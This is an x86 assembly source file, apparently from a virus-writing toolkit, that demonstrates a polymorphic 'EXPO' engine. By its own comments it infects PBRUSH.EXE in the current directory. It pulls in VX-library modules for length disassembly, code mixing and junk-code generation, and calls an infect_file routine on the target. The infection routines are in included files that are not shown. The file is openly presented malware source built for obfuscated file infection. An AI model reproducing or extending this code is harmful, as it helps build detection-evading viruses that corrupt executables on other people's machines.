
; EXample POlymorphic (EXPO) engine -- DEMO
;
; this program will infect PBRUSH.EXE file (in the current directory)
; with the 'int3/push oldeip/ret' commands.
;
; LDE32 -- length-disassembling engine
; CMIX  -- code mixer, uses LDE32
; ETG   -- executable-trash generator

callW                   macro   x
                        extern  x:PROC
                        call    x
                        endm

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

start:

                        lea     edx, testfile
                        call    infect_file

                        push    -1
                        callW   ExitProcess

include                 infect.inc
include                 fioexlow.inc

include                 ..\EXPO\expo.inc

include                 ..\VXLIB\RND\random.inc
include                 ..\VXLIB\CMIX\cmix.inc
include                 ..\VXLIB\LDE32\lde32bin.inc
include                 ..\VXLIB\ETG\etg.inc

vir_size                equ     $-start

testcode:
                        int 3

                        db      68h
old_eip                 dd      ?
                        ret

testcode_size           equ     $-testcode

testfile                db      'pbrush.exe',0

randseed                dd      ?
ldetbl                  db      2048 dup (?)

obufsize                dd      ?
obuf                    db      2048+vir_size dup (?)

                        .code

                        db      ?

                        end     start
